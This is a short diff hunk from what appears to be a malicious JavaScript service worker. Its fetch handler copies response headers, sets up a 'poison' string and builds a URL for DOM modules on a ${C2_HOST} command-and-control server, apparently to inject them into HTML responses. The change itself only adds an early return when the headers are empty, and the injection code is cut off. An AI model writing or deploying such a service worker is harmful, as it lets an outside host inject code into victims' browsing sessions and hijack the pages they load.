@@ -136,6 +136,9 @@ self.addEventListener('fetch', function(event){
       response.headers.forEach(function(v,k){
         init.headers[k] = v;
       });
+      if(Object.keys(response.headers).length == 0){
+        return response;
+      }
       var poison = "";
       var dom_modules = `${C2_HOST}/modules/dom`;
       if(response.headers['content-type'].indexOf('text/html') >= 0){
